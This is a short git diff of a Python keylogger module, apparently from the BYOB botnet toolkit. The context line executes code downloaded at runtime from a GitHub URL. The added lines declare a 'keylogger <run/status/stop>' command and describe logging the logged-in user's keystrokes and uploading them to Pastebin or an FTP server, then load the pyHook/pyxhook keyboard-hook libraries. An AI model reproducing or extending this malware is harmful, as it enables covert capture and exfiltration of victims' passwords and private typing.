@@ -19,12 +19,24 @@ exec compile(urllib.urlopen('https://raw.githubusercontent.com/colental/byob/mas
 sys.modules['util'] = util
 
 # globals
-packages  = ['pyHook','pythoncom'] if os.name == 'nt' else ['pyxhook']
+packages = ['pyHook','pythoncom'] if os.name == 'nt' else ['pyxhook']
 platforms = ['win32','linux2','darwin']
-window    = None
-max_size  = 4000
-log       = StringIO.StringIO()
-results   = {}
+window = None
+max_size = 4000
+log = StringIO.StringIO()
+results = {}
+usage = 'keylogger <run/status/stop>'
+description = """
+Log the keystrokes of the currently logged-in user on the 
+client host machine and optionally upload them to Pastebin
+or an FTP server 
+"""
+
+# setup
+if util.is_compatible(platforms, __name__):
+    util.imports(packages, globals())
+else:
+    sys.exit()
 
 # main
 def _event(event):
